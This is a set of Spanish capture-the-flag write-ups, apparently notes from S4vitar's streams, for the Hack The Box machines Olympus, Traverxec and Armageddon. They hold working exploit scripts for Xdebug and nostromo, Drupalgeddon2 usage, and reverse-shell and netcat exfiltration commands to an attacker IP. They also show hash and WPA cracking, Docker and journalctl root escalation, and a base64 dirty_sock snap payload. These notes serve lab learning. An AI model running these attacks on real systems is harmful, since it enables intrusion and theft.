[["index.html", "2021 - S4viNotes Preface Introduction Acknoledgement", " 2021 - S4viNotes Lo0pInG 404 updated on 2021-07-25 Preface Introduction Este es el Notebook de los lives en Twitch del tito S4vitar. Aqui podreis encontrar los passos impotantes de cada maquina echa. Este book no tiene que estar considerado como una lista de Walktrough, pero mas como unas notas de technicas utilizadas durante la resolucion de maquinas. Por cierto no estara listado los passwords o algun usuarios, menos si estan utilizados en commandos. Cada maquina esta separada de la manera siguiente: Introduccion y link del directo Fase de enumeracion Notas sobre las vulnerabilidades econtradas Explotacion de vulnerabilidades para ganar accesso a la maquina victima Parte de escalacion de privilegios Espero que este book ayude a la comunidad. Todas las notas estan disponibles separadas por typos y categorias en el hacking Notebook. Acknoledgement Me gustaria dar las gracias a S4vitar por su contenido de calidad y las ganas que mete a lo que hace para la comunidad. Son estas ganas que me motivaron en querer aprender mas y mas. Y como la mejor manera que tengo de aprender es tomando notas, este book no existiria sin el. "],["olympus.html", "Olympus Introduccion Enumeracion Vulnerability Assessment Vuln exploit &amp; Gaining Access Privilege Escalation", " Olympus Introduccion La maquina del dia 22/07/2021 se llama Olympus. El replay del live se puede ver en Twitch: S4vitaar Olympus maquina Enumeracion Reconocimiento de maquina, puertos abiertos y servicios Ping ping -c 1 10.10.10.83 ttl: 63 -&gt; maquina linux Nmap nmap -p- --open -T5 -v -n 10.10.10.83 Que lento madre mia… nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.83 -oG allPorts extractPorts allPorts nmap -sC -sV -p53,80,2222 10.10.10.83 -oN targeted Puerto Servicio Que se nos occure? Que falta? 53 domain Domain zone transfer Un nombre de dominio 80 http whatweb, http-enum Checkear la web 2222 ssh conneccion a la maquina Usuario contraseña Empezamos por el puerto 80 Whatweb whatweb http://10.10.10.83 Nada interessante Browsear la web Hay una imagen, se nos occure steganografia pero no hay nada. El Wappalyser no dice que el servidor web empleado es un Apache. WFuzz Como no hay mucho mas que ver, applicaremos fuzzing para descubrir si hay mas rutas. wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.83/FUZZ No hay nada, creamos un fichero de extensiones txt, php, html y fuzzeamos otravez. wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensions http://10.10.10.83/FUZZ.FUZ2Z No hay nada. Dig Dig a no confundir con dick ;) es una utilidad que nos permite recojer informaciones a nivel de dns. Añadir la ip y el hostname en el /etc/hosts 10.10.10.83 olympus.htb Lanzar Dig para recojer informaciones dig @10.10.10.83 olympus.htb No hay respuesta valida lo que quiere decir que el dominio no es valido Checkear las cabezeras de las respuestas a lado del servidor curl -X GET -s &quot;http://10.10.10.83/&quot; -I Figure 1: curl xdebug Algo interessante en la respuesta es el Xdebug 2.5.5. Xdebug es una extension de PHP para hacer debug con haremientas depuracion tradicionales, desde el editor, tal como se hace en lenguajes de programacion clasicos. Mas informaciones sobre Xdebug en desarolloweb.com Vulnerability Assessment searchsploit Checkeamos si existe un exploit relacionado con Xdebug 2.5.5 searchsploit xdebug Hay un script en Ruby (Metasploit) que permitiria hacer execucion de commandos. Analizamos el exploit con el commando searchsploit -x xdebug Que hace el exploit? esta tirando de index.php se pone en escucha en el equipo de attackante en el puerto 9000 usa el commando eval deposita en una ruta del servidor un fichero con su contenido en base64 executa el fichero con php la peticion esta enviada por el methodo GET con 'Cookie' =&gt; 'XDEBUG_SESSION=+rand_text_alphanumeric(10)' Pruebas del exploit Nos ponemos en escucha en el puerto 9000 nc -nlvp 9000 Enviamos un peticion GET con el XDEBUG_SESSION en cookie curl -s -X GET &quot;http://10.10.10.83/index.php&quot; -H &quot;Cookie: XDEBUG_SESSION=EEEEE&quot; Recivimos datos del lado del servidor. Exploitacion de la vulnerabilida Buscamos un exploit en github y encontramos un script cortito que vamos a modificar y llamar exploit_shell.py #!/usr/bin/python3 import socket import pdb from base64 import b64encode ip_port = (&#39;0.0.0.0&#39;, 9000) sk = socket.socket() sk.bind(ip_port) sk.listen(10) conn, addr = sk.accept() while True: client_data = conn.recv(1024) print(client_data) data = input(&#39;&gt;&gt; &#39;) data = data.encode(&#39;utf-8&#39;) conn.sendall(b&#39;ebal -i -- &#39; + b64encode(data) + b&#39;\\x00&#39;) Lanzamos el exploit python3 exploit_shell.py Lanzamos una peticion GET curl -s -X GET &quot;http://10.10.10.83/index.php&quot; -H &quot;Cookie: XDEBUG_SESSION=EEEEE&quot; En la mini shell abierta del exploit_shell.py lanzamos un whoami system(&#39;whoami&#39;) En la respuesta del curl se nos pone www-data El exploit functionna y el commando ifconfig nos da una ip que no es la 10.10.10.83. Quiere decir que estamos en un contenedor. Vuln exploit &amp; Gaining Access Ganando accesso con la vuln XDebug Nos ponemos en escucha con netcat nc -nlvp 443 Con el exploit exploit_shell.py lanzamos una reverse shell system(&#39;nc -e /bin/bash 10.10.14.20 443&#39;) De esta manera, hemos ganado accesso al equipo. Tratamiento de la TTY script /dev/null -c bash ^Z stty raw -echo; fg -&gt; reset -&gt; xterm export TERM=xterm export SHELL=bash stty -a stty rows &lt;rownb&gt; columns &lt;colnb&gt; Investigamos la maquina cd /home #Output zeus ls /home/zeus #Output airgeddon Airgeddon.cap crack with Aircrack-ng Airgeddon es una suite de utilidades para hacer auditorias wifi. Entrando en el repertorio airgeddon del usuario zeus encontramos otro repertorio llamado captured. Filtrando el contenido del directorio aigedon por ficheros find \\-type f encontramos un fichero captured.cap Vamos a transferir el fichero captured.cap a nuestro equipo de attackante En la maquina de attackante nc -nlvp 443 &gt; captured.cap En el contenedor nc 10.10.14.28 443 &lt; captured.cap Saviendo que Airgeddon es una utilidad de auditoria wifi intentamos ver lo que contiene el captured.cap con la utilidad aircrack-ng. aircrack-ng captured-cap Figure 2: aircrack-ng sobre airgeddon capture Se ve un ESSID que se llama To_cl0se_to_th3_Sun que parrece turbio, y un handshake que significa que alguien a esperado que una victima se connecte o reconnecte tras un attaque de deauthentificacion y a recuperado el hash de authentificacion. Analizando la captura con tshark se ve que a sido un attaque de deauthentificacion tshark -r captured.cap 2&gt;/dev/null o filtrado por deauthentificacion tshark -r captured.cap -Y &quot;wlan.fc.type_subtype==12&quot; -Tfields -e wlan.da 2&gt;/dev/null Crackeo con Aircrack-ng aircrack-ng -w /usr/share/wordlists/rockyou.txt captrured.cap Este crack duraria aprox una hora. Con investigacion S4vi a pillado una palabra flight en un fichero .txt y buscando por el dios griego del vuelo encontro que este dios seria icarus. Para ganar tiempo, se crea un diccionario mas pequenito que contiene la palabra icar grep &quot;icar&quot; /usr/share/wordlists/rockyou.txt &gt; dictionary.txt aircrack-ng -w dictionary.txt captured.cap Ya encontramos la contraseña. Crackeo con John Extraemos lo que nos interressa del fichero captured.cap en un fichero mas pequenito que se llama Captura.hccap que con la utilidad hccap2john no permite transformarldo en un hash compatible con John aircrack-ng -J Captura captured.cap hccap2john Captura.hccap &gt; hash john -wordlist=/usr/share/wordlists/rockyou.txt hash Conneccion a la maquina victima Ahora que tenemos un usuario potencial y una contraseña, intentamos connectar con ssh al puerto 2222 ssh icarus@10.10.10.83 Con la contraseña encontrada no nos functionna. Intentamos con el nombre turbio de esta red inalhambrica como contraseña. Y PA DENTRO Investigacion de la maquina victima Hay un fichero que contiene un nombre de dominio valido ctfolympus.htb Intentamos poner el nombre del dominio en el /etc/hosts pero la web sigue siendo la misma. Sabiendo que el puerto 53 esta habierto y teniendo ahora un nombre de dominio valido, podemos hacer un attacke de transferencia de zona con dig Attacke de transferencia de zona con dig El tito nos vuelve a decir que es muy importante no confundir la arremienta dig con dick. Dig esta en la categoria Sciencia y Technologia y la otra en la categoria HotTub ;) dig @10.10.10.83 ctfolympus.htb Como dig nos responde, ya podemos ir enumerando cosas Enumerar los mail servers dig @10.10.10.83 ctfolympus.htb mx Intentamos un attacke axfr dig @10.10.10.83 ctfolympus.htb axfr Figure 3: dig ctfolympus.htb Se puede ver que hay un usuario y una contraseña potencial en un TXT con una lista de puertos. La idea aqui seria de hacer un Port Knocking Port Knocking En este caso la idea seria connectarse al puerto 22 (es una supposicion). El problema es que este puerto esta cerrado. La idea de la technica de Port Knocking es que si el attackante golpea unos puertos en un orden definido, por iptables se puede exponer o bloquear un puerto. nmap -p3456,8234,62431,22 --open -T5 -v -n 10.10.10.83 -r [!] NOTAS: El argumento -r es para decir a NMAP de scannear los puertos en este mismo orden Lanzando el commando multiples veces, NMAP nos reporta ahora quel puerto 22 esta ya habierto. Lo que se puede hacer es, de seguida despues del Port Knocking con nmap, lanzar un commando ssh a la maquina. nmap -p3456,8234,62431,22 --open -T5 -v -n 10.10.10.83 -r &amp;&amp; ssh prometheus@10.10.10.83 Perfecto se nos pregunta por una contraseña Y PA DENTRO En este momento ya se puede ver la flag user.txt y Podemos passar a la phase de escalacion de privilegios. Privilege Escalation Enumeracion del usuario en la maquina victima whoami id Ya es sufficiente aqui porque ya se puede ver quel usuario esta en el grupo Docker. Escalacion de privilegios con Docker Checkear las imagenes Docker existentes docker ps Utilizar una imagen existente para crear un contenedor y mountarle la raiz del systema en el contenedor docker run --rm -it -v /:/mnt rodhes bash cd /mnt/root/ cat root.txt Escalar privilegios en la maquina real en el contenedor cd /mnt/bin chmod 4755 bash exit en la maquina real bash -p whoami #Output root "],["traverxec.html", "Traverxec Introduccion Enumeracion Vulnerability Assessment Vuln exploit &amp; Gaining Access Privilege Escalation", " Traverxec Introduccion La maquina del dia 23/07/2021 se llama Traverxec. El replay del live se puede ver en Twitch: S4vitaar Traverxec maquina Enumeracion Reconocimiento de maquina, puertos abiertos y servicios Ping ping -c 1 10.10.10.165 ttl: 63 -&gt; maquina linux Nmap nmap -p- --open -T5 -v -n 10.10.10.165 Va un poquito lento… nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.165 -oG allPorts extractPorts allPorts nmap -sC -sV -p 10.10.10.165 -oN targeted Puerto Servicio Que se nos occure? Que falta? 22 ssh conneccion a la maquina Usuario contraseña 80 http whatweb, http-enum Checkear la web Empezamos por el puerto 80 Whatweb whatweb http://10.10.10.165 nostromo 1.9.6 Checkear la cabezera curl -s -X GET -I http://10.10.10.165 nostromo 1.9.6 Browsear la web Nada interessante. WFuzz Como no hay mucho mas que ver, applicaremos fuzzing para descubrir si hay mas rutas. wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.233/FUZZ No hay nada, creamos un fichero de extensiones txt, php, html y fuzzeamos otravez. wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensions http://10.10.10.233/FUZZ.FUZ2Z No hay nada. Vulnerability Assessment searchsploit Checkeamos si existe un exploit relacionado con nostromo 1.9.6 searchsploit nostromo Hay un script en Python que permitiria hacer execucion de commandos. Nos traemos el script en el repertorio de trabajo. searchsploit -m 47837 mv 47837.py nostromo_exploit.py Analizando el script con cat, vemos como se uza el exploit. Intentamos reproduzir los passos antes de crearnos nuestro proprio script. En una terminal nc -nlvp 443 En otra terminal telnet 10.10.10.165 80 POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0 Content-Length: 1 whoami | nc 10.10.14.20 443 Se ve www-data en la primera terminal. Ya podemos crearnos el script. Vuln exploit &amp; Gaining Access Autopwn.py #!/usr/bin/python3 import requests import sys import signal import pdb import threading import time from pwn import * def def_handler(sig, frame): print(&quot;\\n[!] Saliendo...\\n&quot;) sys.exit(1) # Ctrl+C signal.signal(signal.SIGINT, def_handler) # Variables globales main_url = &quot;http://10.10.10.165/.%0d./.%0d./.%0d./.%0d./bin/sh&quot; lport = 443 def makeRequest(): data_post = { b&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.20/443 0&gt;&amp;1&quot;&#39; } r = requests.post(main_url, data=data_post) if __name__ == &#39;__main__&#39;: try: threading.Thread(target=makeRequest, args=()).start() except Exception as e: log.error(str(e)) p1 = log.progress(&quot;Acceso&quot;) p1.status(&quot;Ganando acceso al sistema&quot;) shell = listen(lport, timeout=5).wait_for_connection() if shell.sock is None: p1.failure(&quot;No ha sido posible ganar acceso al sistema&quot;) sys.exit(1) else: shell.interactive() Lo ejecutamos python autopwn.py whoami #Output www-data ifconfig El tito prefiere entablarse una shell normal. Se pone en escucha con nc -nlvp 443 y lanza en la shell creado por el script bash -i &gt;&amp; /dev/tcp/10.10.14.20/443 0&gt;&amp;1 Tratamiento de la TTY script /dev/null -c bash ^Z stty raw -echo; fg -&gt; reset -&gt; xterm export TERM=xterm export SHELL=bash stty -a stty rows &lt;rownb&gt; columns &lt;colnb&gt; Privilege Escalation Enumeracion del usuario en la maquina victima cd /home #Output david ls /home/david #Output Permisson denied ls -l /home #Output drwx--x--x Enumeramos el systema cd / id sudo -l find \\-perm -4000 2&gt;/dev/null cd /var ls cd nostromo cd conf cat nhttpd.conf cat /var/nostromo/conf/.htpasswd Encontramos el hash del usuario david vamos a copiarlo en la maquina de attackante, y intentamos bruteforcear con John John john --wordlist=/usr/share/wordlists/rockyou.txt hash Encontramos una contraseña intentamos ponerla aciendo un su david y su root, pero no va. La conclusion a la que hay que llegar es que cuando miras el fichero nhttpd.conf, dice que hay un directorio public_www. Investigacion del public_www Intentamos ver si esta en el directorio /home/david/public_www y effectivamente. hay un fichero comprimido y nos vamos a transferir a nuestro equipo de attaquante. En el equipo de attaquante nc -nlvp 443 &gt; comprimido.tgz En el equipo victima nc 10.10.14.20 443 &lt; backup-ssh-identity-files.tgz Descomprimimos el archivo con el commando 7z l comprimido.tgz 7z x comprimido.tgz 7z l comprimido.tar 7z x comprimido.tar Hay la clave privado del usuario david pero esta protegida por contraseña. La tenemos que romper. ssh2john ssh2john.py id_rsa &gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash La contraseña de la id_rsa a sido crackeada y ya nos podemos connectar con ssh ssh -i id_rsa david@10.10.10.165 Escalada de privilegio para root ls -l #Output bin cd bin/ cat server-stats.sh Vemos en este fichero que sudo puede executar journalctl Vamos a la pagina de gtfobins y buscamos por jounalctl El gtfobins dice que hay que lanzar jounalctl con sudo y en otra linea poner !/bin/sh [!] NOTA: cuando pone ! en otra linea quiere decir que hay que ejecutarlo en modo less. O sea hay que reducir la terminal para que se pueda introducir un nuevo commando. En este caso !/bin/sh Ya estamos root y seguimos mas hack que nunca. "],["armageddon.html", "Armageddon Introduccion Enumeracion Vulnerability Assessment Vuln exploit &amp; Gaining Access Privilege Escalation", " Armageddon Introduccion La maquina del dia 24/07/2021 se llama Armageddon. El replay del live se puede ver en Twitch: S4vitaar Olympus maquina Enumeracion Reconocimiento de maquina, puertos abiertos y servicios Ping ping -c 1 10.10.10.233 ttl: 63 -&gt; maquina linux Nmap nmap -p- --open -T5 -v -n 10.10.10.233 -oG allPorts extractPorts allPorts nmap -sC -sV -p53,80,2222 10.10.10.83 -oN targeted Drupal 7 Puerto Servicio Que se nos occure? Que falta? 22 ssh Accesso directo usuario y contraseña 80 http Drupal-armageddon (drupalgeddon2) Checkear el exploit Browsear la web Nada interessante. Vulnerability Assessment Druppalgeddon Druppalgeddon2 es un exploit creado por Hans Topo y g0tmi1k escrito en ruby que approvecha de vulnerabilidades de drupal y que directamente nos daria una shell. git clone https://github.com/dreadlocked/Drupalgeddon2 cd Drupalgeddon2 cat drupalgeddon2.rb ruby drupalgeddon2.rb Vuln exploit &amp; Gaining Access Druppalgeddon ruby druppalgeddon2.rb 10.10.10.233 whoami #Output &gt; apache ifconfig #Output &gt; 10.10.10.233 Entablamos ahora una reverse shell para sacarse de este contexto. maquina de attackante nc -nlvp 443 druppalgeddon2 shell bash -i &gt;&amp; /dev/tcp/10.10.14.20/443 0&gt;&amp;1 Esto no functiona porque le commando contiene bad chars. Como la maquina no tiene nc ni ncat la tecnica seria la siguiente: Creamos un archivo index.html que contiene #!/bin/bash bash -i &gt;&amp; /dev/tcp/10.10.14.20/443 0&gt;&amp;1 Compartimos un servidor web con python python3 -m http.server 80 En la drupalgeddon2 shell curl -s 10.10.14.20 | bash ya esta… Tratamiento de la TTY script /dev/null -c bash ^Z En este caso no nos va el tratamiento de la TTY. En este caso lo que hacemos es utilizar el rlwrap nc -nlvp 443 Investigamos la maquina pwd #Output /var/www/html ls -l #Output muchas cosas grep -r -E -i &quot;user|pass|key&quot; #Output muchas cosas grep -r -E -i &quot;username|pass|key&quot; #Output muchas cosas Como hay muchas cosas y es difficil de analizar usamos el commando find y vamos quitando con el commando grep -v las cosas que no nos interressan poco a poco. find \\-type -f 2&gt;/dev/null find \\-type -f 2&gt;/dev/null | grep -v &quot;themes&quot; find \\-type -f 2&gt;/dev/null | grep -v -E &quot;themes|modules&quot; Ahora ya se puede investigar manualmente. Apuntamos los recursos que parecen interessantes. authorize.php cron.php includes/database includes/password.inc sites/default/ Lo miramos hasta que encontremos cosas interessantes. En un fichero encontramos un user drupaluser y su contraseña. Miramos los usuarios de la maquina grep &quot;sh$&quot; /etc/passwd #Output root brucetherealadmin Como el servicio ssh esta abierto miramos si la contraseña functiona con el usuario brucetherealadmin pero no functiona. Como hemos visto ficheros mysql intentamos connectar con el drupaluser y functiona. mysql -u &#39;drupaluser&#39; -p &quot;SLKDENkldajsn!!$&quot; -e &#39;show databases;&#39; mysql -u &#39;drupaluser&#39; -p &quot;SLKDENkldajsn!!$&quot; -e &#39;use drupal; show tables;&#39; mysql -u &#39;drupaluser&#39; -p &quot;SLKDENkldajsn!!$&quot; -e &#39;use drupal; describe users;&#39; mysql -u &#39;drupaluser&#39; -p &quot;SLKDENkldajsn!!$&quot; -e &#39;use drupal; select name,pass from users;&#39; Encontramos el usuario ‘brucetherealadmin’ y su contraseña encryptada. John copiamos el hash en un fichero llamado hash john –wordlist=/usr/share/wordlists/rockyout.txt hash Ya tenemos contraseña para el usuario brucetherealadmin SSH ssh brucetherealadmin@10.10.10.233 ya tenemos la flag user.txt Privilege Escalation Enumeracion del usuario en la maquina victima whoami id sudo -l Vemos que podemos lanzar snap como root. Buscamos en google snap hook exploit .snap file y encontramos el link siguiente Linux Privilege Escalation via snapd (dirty_sock exploit). Econtramos un hook que genera un nuevo local user. Lo miramos y lo reutilizamos usando python. echo &quot;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/ /////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5 TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2 XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5 RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&quot; | xargs | tr -d &#39; &#39; copiamos el output y recreamos el paquete snap malicioso cd /tmp pytho -c &#39;print &quot;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD //////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29 jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1 EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2Q gLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N 1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciB leHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiA gJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAA BaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3F qfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4 wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRj NEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPt vjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAA AAAAAPgMAAAAAAAAEgAAAAACAA&quot; + &quot;A&quot;*4256 + &quot;==&quot;&#39; | base64 -d &gt; setenso.snap sudo /usr/bin/snap install setenso.snap --devmode cat /etc/passwd sudo dirty_sock &gt; password dirty_sock sudo su &gt; password dirty_sock whoami #Output root "]]
